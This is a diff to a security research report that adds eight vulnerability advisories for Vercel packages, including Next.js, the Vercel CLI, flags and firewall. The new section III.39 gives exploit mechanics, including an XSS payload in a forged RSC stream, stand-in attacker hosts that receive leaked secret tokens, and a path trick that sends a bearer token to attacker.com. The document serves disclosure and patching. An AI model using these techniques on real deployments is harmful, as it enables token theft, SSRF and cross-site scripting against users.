@@ -7,7 +7,7 @@
 This comprehensive technical guide and security research report consists of three main parts:
 1. **Part I — Real-Hardware macOS (Apple Silicon) Installation & Runtime Verification Report:** End-to-end testing and verification results of Sniper Community on real macOS hardware across both **Native Source Setup (`--core-only`)** and the **Docker Desktop 5-Engine (`community-tools`)** profile.
 2. **Part II — 8 Open-Source Repositories Scanned with Sniper, Vulnerability Mechanics & Everyday Scenarios:** Source-code-level audit of **8 open-source repositories** scanned by **Gökçe Baran Karakamış** using the **Sniper** static analysis (SAST), infrastructure-as-code (IaC), and software composition analysis (SCA) engine — including false-positive elimination, plain-language explanations of how each code/configuration pattern turns into a vulnerability, **3 concrete everyday critical scenarios (`Scenario A / B / C`)** per repository, and **example execution & verification commands**.
-3. **Part III — 38 Verified Security Advisories (37 Original Vulnerabilities + 1 Upstream Duplicate Note) Discovered in Our Sniper Scans (`01`..`11`), Code Mechanics, Scenarios & Runtime Proofs (`RED -> GREEN + BENIGN`):** Complete technical analysis of **38 verified security advisories (37 original vulnerabilities + 1 upstream `CVE-2026-40295` duplicate defense-in-depth note)** discovered across 6 open-source projects (**Stirling-PDF, TryCua `cua`, OpenZiti, n8n, Gotify Server, NIIS X-Road**) and reported as GitHub Security Advisories (`GHSA`), explaining step by step how each bug occurs in code and turns into an exploitable vulnerability, **3 everyday critical scenarios (`Scenario A / B / C`)** for each finding, **example reproduction/verification commands**, and **runtime proofs (`RED -> GREEN + BENIGN`)**.
+3. **Part III — 46 Verified Security Advisories (45 Original Vulnerabilities + 1 Upstream Duplicate Note) Discovered in Our Sniper Scans (`01`..`11`), Code Mechanics, Scenarios & Runtime Proofs (`RED -> GREEN + BENIGN`):** Complete technical analysis of **46 verified security advisories (45 original vulnerabilities + 1 upstream `CVE-2026-40295` duplicate defense-in-depth note)** discovered across 6 open-source projects (**Stirling-PDF, TryCua `cua`, OpenZiti, n8n, Gotify Server, NIIS X-Road**) and reported as GitHub Security Advisories (`GHSA`), explaining step by step how each bug occurs in code and turns into an exploitable vulnerability, **3 everyday critical scenarios (`Scenario A / B / C`)** for each finding, **example reproduction/verification commands**, and **runtime proofs (`RED -> GREEN + BENIGN`)**.
 
 ---
 
@@ -490,7 +490,7 @@ python3 cli_reports.py --input "$HOME/audit-targets/reports/jadx-mcp-audit.json"
 
 ## Part III — Verified Vulnerabilities Discovered in Our Sniper Scans (11 Verified Security Advisories, Code-to-Vulnerability Mechanics, Everyday Scenarios & Example Execution Commands)
 
-Below are the **38 verified security advisories (37 original vulnerabilities + 1 upstream `CVE-2026-40295` duplicate defense-in-depth note)** ([advisories/README.md](advisories/README.md)) discovered during security scans conducted with the **Sniper** static/dynamic analysis engine — complete with **Step-by-Step Everyday Critical Scenarios (`Scenario A / B / C`)**, **End-to-End Runtime Proofs (`RED -> GREEN + BENIGN`)**, and **Verified Defensive Patches (`git diff`)**. First is the summary table, followed immediately by **11 in-depth technical sections (`III.01` – `III.38`)** explaining how each bug arises in source code, how it turns into an exploitable vulnerability, 3 everyday critical scenarios, and example execution/verification commands:
+Below are the **46 verified security advisories (45 original vulnerabilities + 1 upstream `CVE-2026-40295` duplicate defense-in-depth note)** ([advisories/README.md](advisories/README.md)) discovered during security scans conducted with the **Sniper** static/dynamic analysis engine — complete with **Step-by-Step Everyday Critical Scenarios (`Scenario A / B / C`)**, **End-to-End Runtime Proofs (`RED -> GREEN + BENIGN`)**, and **Verified Defensive Patches (`git diff`)**. First is the summary table, followed immediately by **11 in-depth technical sections (`III.01` – `III.46`)** explaining how each bug arises in source code, how it turns into an exploitable vulnerability, 3 everyday critical scenarios, and example execution/verification commands:
 
 | # | Advisory & Upstream GHSA ID | Target Project & Component | CWE & CVSS v3.1 | Critical Everyday Impact Scenarios (`Scenario A / B / C`) | Runtime Proof (`RED -> GREEN`) |
 | :-: | :--- | :--- | :--- | :--- | :--- |
@@ -532,6 +532,14 @@ Below are the **38 verified security advisories (37 original vulnerabilities + 1
 | **36** | [`36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md`](advisories/36-CHIA-POS-VDF-NATIVE-CPP-INTEGER-TRUNCATION-AND-OOB-MEMORY-CORRUPTION.md)<br/>`CHIA-POS-02..04`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chiapos** (`<= 2.0.11`)<br/>`src/verifier.hpp:48-108` (`Verifier::ValidateProof`)<br/>`src/bits.hpp:184`<br/>`src/prover_disk.hpp:254-322` (`DiskProver`) | `CWE-190 / CWE-787 / CWE-125`<br/>**8.1 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H` | **How It Happens in Code:** `Verifier::ValidateProof` (`src/verifier.hpp`, `src/bits.hpp:184`) overflows bit offsets at `k=50` (Table 4) and `k>=60`, and `DiskProver` (`src/prover_disk.hpp`) truncates 64-bit plot table sizes to 32-bit.<br/>**Scenario A (Crafted `.plot` Heap Overflow):** Loading a crafted `.plot` file triggers 64-to-32-bit truncation heap corruption.<br/>**Scenario B (`k=50` / `k=60` Stack OOB):** Verified via ASan/UBSan `chiapos_k_probe` (`exit_code=1`).<br/>**Scenario C (`GREEN` Patch):** Bounds-checked (`exit_code=0`). | `RED`: `k50_table4_asan_exit: 1, k60_asan_exit: 1 (src/bits.hpp:184 OOB)`<br/>`GREEN`: `exit_code: 0, rejected_cleanly: true`<br/>`pytest -k chiapos` |
 | **37** | [`37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md`](advisories/37-CHIA-VDF-02-CHIAVDF-MALFORMED-PROOF-OOB-READ-AND-UAF.md)<br/>`CHIA-VDF-02`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chiavdf** (`<= 1.1.11`)<br/>`src/verifier.cpp` (`CheckProofOfTimeNWesolowski`)<br/>`src/prover_slow.h` | `CWE-125 / CWE-416`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | **How It Happens in Code:** `CheckProofOfTimeNWesolowski` (`src/verifier.cpp`) slices `proof_blob` without validating `proof_blob_len` or `num_iterations > 0`.<br/>**Scenario A (Verifier OOB Crash):** Truncated VDF proof triggers native C++ out-of-bounds read.<br/>**Scenario B (Teardown UAF):** Worker thread accesses freed state in `prover_slow.h`.<br/>**Scenario C (`GREEN` Patch):** Returns `false` cleanly on malformed VDF proofs. | `RED`: `asan_oob_or_segv: true, exit_code: 1`<br/>`GREEN`: `asan_oob_or_segv: false, verified: false`<br/>`chiavdf ASan harness` |
 | **38** | [`38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md`](advisories/38-CHIA-DL-02-DATALAYER-MIRROR-HTTP-REDIRECT-SSRF.md)<br/>`CHIA-DL-02`<br/>MITRE CNA-LR & Chia Network | **Chia-Network/chia-blockchain** (`<= 2.7.5`)<br/>`chia/data_layer/download_data.py`<br/>`chia/data_layer/data_layer.py` | `CWE-918`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` | **How It Happens in Code:** `download_data.py` fetches DataLayer mirror URLs with `allow_redirects=True` and no loopback/private IP validation on redirect hops.<br/>**Scenario A (Internal Loopback/Metadata SSRF):** A `302` redirect on an announced mirror URL hits `127.0.0.1` / `169.254.169.254`.<br/>**Scenario B (Replica Fleet Scanning):** Subscribed nodes poll redirected internal hosts.<br/>**Scenario C (`GREEN` Patch):** Blocks redirects to private/loopback IPs. | `RED`: `redirect_to_loopback_followed: true, internal_hit_count: 1`<br/>`GREEN`: `redirect_to_loopback_followed: false, internal_hit_count: 0`<br/>`pytest -k dl02` |
+| **39** | [`39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md`](advisories/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md)<br/>`VERCEL-NEXT-15`<br/>MITRE CNA-LR & HackerOne #4152250 (+2 Follow-Up Comments Mounted) | **vercel/next.js** (`next <= 16.4.3`)<br/>`packages/next/src/server/app-render/action-handler.ts:363-411, 962-1166`<br/>`packages/next/src/client/components/router-reducer/reducers/server-action-reducer.ts:154-201` | `CWE-200 / CWE-918 / CWE-345`<br/>**8.2 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N` | **How It Happens in Code:** `createRedirectRenderResult()` (`action-handler.js:278-303`) fetches Server Action redirect targets without `redirect: 'manual'`, following external `302` hops with `x-next-revalidate-tag-token` (`previewModeId`) and piping external RSC Flight streams back under a same-origin `x-action-redirect`. Omitting `"b"` in Flight data bypasses `server-action-reducer.js:161` Build ID checks (`UXSS`).<br/>**Scenario A (SSO/OIDC `previewModeId` Theft):** Multi-tenant SSO login Server Action leaks `previewModeId` to tenant IdP.<br/>**Scenario B (Global ISR Cache Wiping):** Stolen `previewModeId` authorizes `x-prerender-revalidate` cache purging.<br/>**Scenario C (Same-Origin RSC Flight UXSS):** OAuth bounce `302` injects forged RSC Virtual DOM (`response.b === undefined`) and CORS headers into `victim-app.com`. | `RED`: `leaked_previewModeId: f5dbbd8f6a6a51a6aa8ff1443f7090dd, client_build_id_check_bypassed: true, flight_uxss: true`<br/>`GREEN`: `redirect: 'manual', external_hop_followed: false`<br/>HackerOne `#4152250` (+2 Comments) |
+| **40** | [`40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md`](advisories/40-VERCEL-NEXT-09-IMAGE-OPTIMIZER-REDIRECT-ALLOWLIST-AND-PRIVATE-IP-FAIL-OPEN-SSRF.md)<br/>`VERCEL-NEXT-09`<br/>MITRE CNA-LR & HackerOne #4152265 (+2 Follow-Up Comments Mounted) | **vercel/next.js** (`next <= 16.4.3`)<br/>`packages/next/src/server/image-optimizer.ts:696-729`<br/>`packages/next/src/server/lib/find-root.ts` / `validate-url.ts` (`isPrivateIp`) | `CWE-918 / CWE-863`<br/>**7.5 High**<br/>`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` | **How It Happens in Code:** `fetchExternalImage()` (`image-optimizer.js:586-615`) checks `remotePatterns` only on hop 1, not on `3xx` redirects (`09A`). In `validateUrl()`, `isPrivateIp(ip)` fails open (`if (!ipaddr.isValid(ip)) return false`) on Linux hyphenated IPv6 zone indices (`::ffff:127.0.0.1%br-...`) and classifies `::7f00:1` and `64:ff9b:1::/48` as `unicast` (`09B`).<br/>**Scenario A (Same-Host Pathname Bypass):** `/public-avatars/**` redirects to `/private-kyc-docs/passport-scan.png`.<br/>**Scenario B (Cross-Host Allowlist Pivot):** Allowlisted CDN/avatar service redirects to unapproved internal host.<br/>**Scenario C (`09A -> 09B` Direct `127.0.0.1` TCP Loopback SSRF):** Redirects to `::ffff:127.0.0.1%br-...` / `::7f00:1` to read `127.0.0.1` services. | `RED`: `remotePatterns_bypassed: true, loopback_server_hit: true, remote_addr: ::ffff:127.0.0.1`<br/>`GREEN`: `redirect_rechecked: true, fail_closed: true`<br/>HackerOne `#4152265` (+2 Comments) |
+| **41** | [`41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md`](advisories/41-VERCEL-CLI-07-CURL-PARSER-DIFFERENTIAL-AND-AUTO-MINT-BYPASS-SECRET-LEAK.md)<br/>`VERCEL-CLI-07`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`vercel <= 65.4.0`)<br/>`packages/cli/src/commands/curl/utils.ts:34-42, 74-96, 179-216`<br/>`packages/cli/src/commands/http-cli/index.ts` | `CWE-200 / CWE-436`<br/>**8.2 High**<br/>`AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` | **How It Happens in Code:** `constructFullUrl()` (`packages/cli/src/commands/curl/utils.ts:179-216`) checks `new URL(normalizedPath, baseUrl).origin === baseUrl` but returns raw `${baseUrl}${normalizedPath}`. For `\\@attacker.com`, WHATWG `URL` keeps `origin === baseUrl`, whereas `libcurl` treats `baseUrl\\` as userinfo and `attacker.com` as host.<br/>**Scenario A (CI/CD Token Exfiltration):** `vercel curl` sends `Authorization: Bearer` and `x-vercel-protection-bypass` to `attacker.com`.<br/>**Scenario B (Developer/Agent CLI Leak):** Malicious path steals live CLI session token.<br/>**Scenario C (Auto-Minted Bypass Leak):** `PATCH /v10/projects/{id}/protection-bypass` mints and leaks project secret. | `RED`: `whatwg_origin_check_passed: true, curl_connected_to_attacker: true, leaked_bearer: true`<br/>`GREEN`: `rejected_backslash_and_globoff: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
+| **42** | [`42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md`](advisories/42-VERCEL-FLAGS-CORE-06-UNPREFIXED-HEADER-WATERMARK-POISONING.md)<br/>`VERCEL-FLAGS-CORE-06`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/flags** (`@vercel/flags-core <= 1.10.2`)<br/>`packages/flags-core/src/controller.ts:555-615`<br/>`packages/flags-core/dist/index.js:465-516` (`streamResponse` / `readBundledDefinitions`) | `CWE-400 / CWE-345`<br/>**6.5 Medium**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H` | **How It Happens in Code:** `Controller.streamResponse()` (`controller.ts:555-615`) updates `datafileUpdatedAtWatermark` from the unprefixed `x-datafile-Updated-At` header even on non-`200` responses before validating the datafile payload.<br/>**Scenario A (Kill-Switch Lockout):** Poisoning `x-datafile-Updated-At: 9999999999999` makes the SDK ignore all subsequent legitimate flag updates.<br/>**Scenario B (Missing `redirect: 'manual'`):** Stream fetch follows `3xx` redirects.<br/>**Scenario C (Worker State Drift):** Long-lived Node workers remain permanently frozen on stale flags. | `RED`: `poisoned_watermark: 9999999999999, bundled_update_ignored: true`<br/>`GREEN`: `requires_res_ok_and_bounded_skew: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
+| **43** | [`43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md`](advisories/43-VERCEL-FLAGS-05-PRECOMPUTE-NO-FLAGS-SENTINEL-JWS-BYPASS.md)<br/>`VERCEL-FLAGS-05`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/flags** (`flags <= 4.4.0`)<br/>`packages/flags/src/next/precompute.ts:206-214`<br/>`packages/flags/dist/next/index.js:119-125` (`deserialize`) | `CWE-347`<br/>**6.5 Medium**<br/>`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N` | **How It Happens in Code:** `deserialize(flags, code, secret)` (`precompute.ts:206-214`) returns `{}` when `code === '__no_flags__'` before verifying the Compact JWS signature, even when `flags.length > 0`.<br/>**Scenario A (Edge Gate Bypass):** Requesting `/__no_flags__/page` skips JWS verification and forces fallback `flag.decide()` execution.<br/>**Scenario B (Cohort Manipulation):** Unauthenticated clients reset signed Edge precomputed cohorts.<br/>**Scenario C (Origin Re-Decide Load):** Forces asynchronous `decide()` execution on precomputed routes. | `RED`: `deserialize('__no_flags__'): {}, getPrecomputed_bypassed_edge_false_to_true: true`<br/>`GREEN`: `requires_flags_length_zero_for_sentinel: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
+| **44** | [`44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md`](advisories/44-VERCEL-FIREWALL-01-CHECKRATELIMIT-HOST-SSRF-SECRET-LEAK-AND-FAIL-OPEN.md)<br/>`VERCEL-FIREWALL-01`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/firewall** (`@vercel/firewall <= 1.2.6`)<br/>`packages/firewall/src/rate-limit.ts:138-183, 211-285`<br/>`cmd/ipc-proxy/client.go:34-41, 79-97` | `CWE-918 / CWE-200 / CWE-636`<br/>**7.2 High**<br/>`AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N` | **How It Happens in Code:** `resolveFirewallHost()` (`rate-limit.ts:138-167`) uses the untrusted `Host` header as the outbound HTTPS target when `VERCEL_ENV !== 'production'`, leaking `x-vercel-rate-limit-secret` and `x-vercel-oidc-token`, and fails open (`{ rateLimited: false }`) on errors.<br/>**Scenario A (Secret Exfiltration):** Forged `Host` header steals `VF_RATE_LIMIT_SECRET`.<br/>**Scenario B (Fail-Open Brute-Force):** Malformed `Host` triggers `{ rateLimited: false }` on login/OTP endpoints.<br/>**Scenario C (Go `ipc-proxy` `%s` Bug):** `client.go:38` leaves literal `%s` in `api-%s.vercel.com`. | `RED`: `leaked_rate_limit_secret: rl_secret_LIVE_99887766, fail_open_rateLimited: false`<br/>`GREEN`: `strict_hostname_regex_and_sprintf_fixed: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
+| **45** | [`45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md`](advisories/45-VERCEL-CLIENT-08A-PREBUILT-FILEPATHMAP-DOTNEXT-ENV-SECRET-UPLOAD.md)<br/>`VERCEL-CLIENT-08A`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`@vercel/client <= 18.10.0`)<br/>`packages/client/src/utils/hashes.ts:115-167`<br/>`packages/client/src/deploy.ts:127-195` (`filesFromFilePathMap`) | `CWE-200 / CWE-706`<br/>**5.0 Medium**<br/>`AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N` | **How It Happens in Code:** `filesFromFilePathMap()` (`packages/client/src/utils/hashes.ts:115-167`) resolves `.vc-config.json` `filePathMap` entries via `path.resolve(cwd, filePath)` without root confinement or `.vercelignore` filtering.<br/>**Scenario A (`.next/required-server-files.json` Leak):** Uploads local `.env` secrets despite `.vercelignore`.<br/>**Scenario B (CI Prebuilt Artifact Traversal):** `../../` entries in `filePathMap` upload host secrets to `/v2/files`.<br/>**Scenario C (Build Cache Poisoning):** Restored `.vc-config.json` exfiltrates runner files. | `RED`: `outside_host_secret_uploaded: true, dotnext_env_secret_uploaded: true`<br/>`GREEN`: `path_confined_to_cwd: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
+| **46** | [`46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md`](advisories/46-VERCEL-CLIENT-08B-PREBUILT-BULKREDIRECTSPATH-SYMLINK-AND-IGNORE-BYPASS.md)<br/>`VERCEL-CLIENT-08B`<br/>MITRE CNA-LR & Vercel Security Advisory | **vercel/vercel** (`@vercel/client <= 18.10.0`)<br/>`packages/client/src/utils/index.ts:116-148`<br/>`packages/client/src/deploy.ts:145-195` (`buildFileTree` / `bulkRedirectsPath`) | `CWE-59 / CWE-200`<br/>**5.0 Medium**<br/>`AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:N/A:N` | **How It Happens in Code:** `buildFileTree()` (`packages/client/src/utils/index.ts:116-148`) resolves `config.bulkRedirectsPath` without `fs.realpath()` root confinement or `.vercelignore` filtering, following symlinks outside `cwd`.<br/>**Scenario A (Symlink Host Read):** Symlink inside `bulkRedirectsPath` uploads `/etc/hostname` or `~/.ssh/id_rsa`.<br/>**Scenario B (`../` Directory Walk):** Parent traversal enumerates and uploads outside directories.<br/>**Scenario C (`.vercelignore` Bypass):** Ignored secret files are uploaded in prebuilt mode. | `RED`: `symlink_target_outside_cwd_uploaded: true`<br/>`GREEN`: `realpath_confinement_and_lstat_enforced: true`<br/>`node verify_npm_stable_tarballs_20261028.mjs` |
 
 ---
 
@@ -3121,3 +3129,610 @@ grep -n -C 10 "session.get" /home/community-user/targets/chia-blockchain/chia/da
 ```
 
 <!-- CHIA-ADVISORIES-END -->
+
+<!-- VERCEL-ADVISORIES-START -->
+
+---
+
+### III.39 — vercel/next.js (`next <= 16.4.3 (verified on published npm next@16.4.3 & canary)`) — Next.js App Router Server Action Internal `redirect()` SSRF, `previewModeId` (`x-next-revalidate-tag-token`) Secret Exfiltration, and Build-ID-Bypassed Same-Origin RSC Flight UXSS (`VERCEL-NEXT-15` / HackerOne `#4152250`) (`CWE-200 / CWE-918 / CWE-345`, CVSS `8.2 High`)
+
+#### 1. Metadata & Disclosure Status
+* **Target Repository & Package:** `vercel/next.js` (`npm / Node.js: next`)
+* **Affected Versions & Components:** `<= 16.4.3 (verified on published npm next@16.4.3 & canary)` — `packages/next/src/server/app-render/action-handler.ts:363-411, 962-1166`, `packages/next/src/client/components/router-reducer/reducers/server-action-reducer.ts:154-201`
+* **Vulnerability Class & Score:** `CWE-200 / CWE-918 / CWE-345` — **CVSS v3.1: `8.2 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N`)
+* **Standalone Sniper Advisory:** [`docs/advisories/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md`](advisories/39-VERCEL-NEXT-15-SERVER-ACTION-REDIRECT-TOKEN-LEAK-AND-FLIGHT-UXSS.md)
+
+#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
+1. **Step 1 — Scheme-Relative URL Acceptance & Missing `redirect: 'manual'` in `createRedirectRenderResult()` (`action-handler.js:270-303`):** While `forwardActionToWorker()` explicitly sets `redirect: 'manual'` (line 175), `createRedirectRenderResult()` calls `await fetch(fetchUrl, { method: 'GET', headers: head, next: { internal: 1 } })` with Undici's default `redirect: 'follow'`. Furthermore, `getAppRelativeRedirectUrl()` checks `redirectUrl.startsWith('/')` without rejecting scheme-relative URLs (`//attacker.example/collect`).
+2. **Step 2 — Unconditional Forwarding of `x-next-revalidate-tag-token` (`previewModeId`) Across External `302` Hops (`action-handler.js:904-911`):** Whenever a Server Action calls `revalidateTag()`, `revalidatePath()`, or `updateTag()` before `redirect()`, `handleAction()` sets `forwardedHeaders['x-next-revalidate-tag-token'] = store.previewProps.previewModeId`. Even when `revalidateTag()` is NOT called, `createRedirectRenderResult()` still follows external `302` redirects on EVERY Server Action `redirect('/internal-path')`.
+3. **Step 3 — Mounted HackerOne Comment #1 (`RE-EVALUATION-COMMENT-4152250`): Same-Origin RSC Flight Stream Hijacking, Universal XSS (`UXSS`), and HTTP Response Header Injection:** Because `handleAction()` sets `res.setHeader('x-action-redirect', `${redirectUrl};${redirectType}`)` using the initial same-origin `/api/oauth-bounce` URL BEFORE calling `createRedirectRenderResult()`, the client browser sees a same-origin redirect while receiving the external server's response body and headers (`Access-Control-Allow-Origin`, `Clear-Site-Data`, etc.). In `dist/esm/client/components/router-reducer/reducers/server-action-reducer.js:161-162`, Next.js checks `if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId())`. By omitting `"b"` in the forged Flight stream (`0:{"f":[[...]],"S":"$1"}\n1:["$","div",null,{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=...>"}}]\n`), `responseBuildId` is `undefined`, completely bypassing the Build ID check and mounting arbitrary DOM/JavaScript into `https://victim-app.com`!
+4. **Step 4 — Mounted HackerOne Comment #2 (`ADDENDUM-SCENARIOS-4152250`): Why External `302` Redirects Exist by Design Without Any Open-Redirect Bug:** Every production Next.js SaaS using Multi-Tenant B2B Enterprise SSO (`redirect(\`/api/sso/authorize?tenant=${domain}\`)` -> `302` to tenant's OIDC IdP), OAuth 2.0 Provider consent (`redirect('/api/oauth/complete')` -> `302` to registered client `redirect_uri`), or Stripe/S3/checkout handoff intentionally issues an external `302` from its internal route.
+
+```javascript
+// 1. Server-side internal redirect fetch WITHOUT redirect: 'manual'
+// File: node_modules/next/dist/esm/server/app-render/action-handler.js (lines 270-303)
+function getAppRelativeRedirectUrl(redirectUrl, basePath, i18n) {
+    if (redirectUrl.startsWith('/')) { // BUG: accepts '//attacker.example' and internal routes that 302 externally
+        return `${basePath}${redirectUrl}`;
+    }
+    return new URL(redirectUrl).pathname;
+}
+async function createRedirectRenderResult(req, res, originalHost, redirectUrl, basePath, staticGenerationStore, workUnitStore) {
+    const fetchUrl = new URL(formattedUrl, `http://localhost:${port}`);
+    // BUG: Missing `redirect: 'manual'`! Undici follows 3xx hops to external hosts while carrying
+    // x-next-revalidate-tag-token (previewModeId) and pipes external Flight body + headers to res!
+    const response = await fetch(fetchUrl, { method: 'GET', headers: head, next: { internal: 1 } });
+    if (response.headers.get('content-type') === RSC_CONTENT_TYPE_HEADER) {
+        copyResponseHeaders(response, res);
+        return new FlightRenderResult(response.body);
+    }
+}
+
+// 2. Client-side Build ID validation skipped when 'b' is omitted (`responseBuildId === undefined`)
+// File: node_modules/next/dist/esm/client/components/router-reducer/reducers/server-action-reducer.js (lines 154-201)
+let redirectFlightData = await createFromNextReadableStream(res.body, ...);
+const { b: responseBuildId, f: flightData } = redirectFlightData;
+if (responseBuildId !== undefined && responseBuildId !== getNavigationBuildId()) {
+    return handleExternalUrl(state, mutable, action.mutable.redirectLocation, state.pushRef.pendingPush);
+}
+```
+
+#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
+* **Scenario A — Enterprise Multi-Tenant SSO / OAuth Login `previewModeId` Secret Theft (Mounted HackerOne `#4152250` Addendum Scenario A):** A B2B SaaS (`https://victim-app.com`) runs a Login Server Action that calls `revalidateTag('auth-session')` and `redirect(\`/api/sso/authorize?tenant=${emailDomain}\`)`, which issues a `302 Found` to the tenant's OIDC IdP (`https://${tenantIdp}/oauth2/v1/authorize`). An attacker enters `user@attacker-corp.com`. Next.js follows the `302` inside Node.js and sends `x-next-revalidate-tag-token: <previewModeId>` (`f5dbbd8f6a6a51a6aa8ff1443f7090dd`) directly to `https://idp.attacker-corp.com`.
+* **Scenario B — Unauthorized On-Demand ISR Cache Wiping & Origin DB Exhaustion Using the Stolen `previewModeId` (Mounted HackerOne `#4152250` Addendum Scenario B):** Because `server/api-utils/node/try-get-preview-data.js:34` checks `req.headers[PRERENDER_REVALIDATE_HEADER] === previewProps.previewModeId`, the attacker replays `x-prerender-revalidate: <previewModeId>` on every cached ISR route (`/`, `/pricing`, `/docs/*`), achieving `200 OK` (`x-nextjs-cache: REVALIDATED`) and forcing continuous cache misses and origin database queries.
+* **Scenario C — Same-Origin Forged RSC Flight UI Injection & Universal XSS (`UXSS`) via Build-ID Bypass (Mounted HackerOne `#4152250` Re-Evaluation Comment #1 & Addendum Scenario C):** Even when a Server Action does NOT call `revalidateTag()`, calling `redirect('/api/oauth-bounce')` causes `handleAction()` to set `x-action-redirect: /api/oauth-bounce;push` (same-origin) while `createRedirectRenderResult()` follows the `302` to `https://attacker-oauth.example/callback`. The external server responds with `Content-Type: text/x-component`, `Access-Control-Allow-Origin: https://attacker-oauth.example`, `Clear-Site-Data: "storage"`, and an RSC Flight payload omitting `"b"` (`response.b === undefined`). `server-action-reducer.js:161` skips Build ID verification and renders the attacker's React Virtual DOM (`dangerouslySetInnerHTML`) directly inside `https://victim-app.com` (`UXSS`).
+
+#### 4. Example Execution, Reproduction & Verification Commands
+```bash
+# 1. Inspect createRedirectRenderResult and server-action-reducer in next@16.4.3
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/server/app-render/action-handler.js | sed -n '270,305p'
+nl -ba /home/community-user/targets/vercel-bounty-audit-20261027/live-dist-verify/node_modules/next/dist/esm/client/components/router-reducer/reducers/server-action-reducer.js | sed -n '154,201p'
+
+# 2. Run the Live next@16.4.3 End-to-End Verification Harness (Scenarios A, B, and C + Patch Check)
+node /home/community-user/targets/vercel-bounty-audit-20261027/pocs/verify_npm_stable_tarballs_20261028.mjs
+git apply --check /home/community-user/targets/vercel-bounty-audit-20261027/patches/FINDING-15-nextjs-action-handler-redirect-token-leak-and-flight-injection.patch
+```
+**Observed Runtime Proof (`RED -> GREEN`):**
+```json
+{
+  "VERCEL-NEXT-15": {
+    "RED": {
+      "package_tested": "next@16.4.3",
+      "hackerone_report": "#4152250 (with 2 follow-up comments mounted)",
+      "prerender_manifest_previewModeId": "f5dbbd8f6a6a51a6aa8ff1443f7090dd",
+      "attacker_received_x_next_revalidate_tag_token": "f5dbbd8f6a6a51a6aa8ff1443f7090dd",
+      "leaked_token_matches_prerender_manifest_previewModeId": true,
+      "forged_flight_stream_injected_into_action_response": true,
+      "response_build_id_field_b": null,
+      "client_build_id_check_bypassed": true,
+      "injected_cors_header_on_victim_origin": "https://attacker-oauth.example"
+    },
+    "GREEN": {
+      "internal_redirect_fetch_mode": "manual",
+      "scheme_relative_redirect_rejected": true,
+      "external_hop_followed_by_server": false,
+      "attacker_received_x_next_revalidate_tag_token": null,
+      "forged_flight_stream_injected_into_action_response": false
+    }
+  }
+}
+```
+
+#### 5. Mounted HackerOne Follow-Up Comments
+### Mounted HackerOne Report `#4152250` Follow-Up Comment #1 (`RE-EVALUATION-COMMENT-4152250.md`)
+
+1. **Why the `302` Target Is Attacker-Controlled in Real-World Next.js Apps Without a Separate Open-Redirect Bug:**
+   - **Pattern 1 — Multi-Tenant B2B Enterprise SSO / OIDC Discovery:** `redirect(\`/api/sso/authorize?tenant=${emailDomain}\`)` issues a `302 Found` to the tenant's IdP (`https://idp.attacker-corp.com/oauth2/authorize`).
+   - **Pattern 2 — OAuth 2.0 / OIDC Provider Consent Server Actions:** `redirect('/api/oauth/complete?session=...')` issues a `302 Found` to the registered OAuth client's `redirect_uri`.
+   - **Pattern 3 — Outbound Link / Checkout Routers:** `redirect(\`/out?dest=${partnerUrl}\`)` issues a `302 Found` to the external destination.
+2. **Secondary High-Severity Impact Even When `revalidateTag()` Is NOT Called — Same-Origin RSC Flight Stream Hijacking & Universal XSS (`UXSS`):**
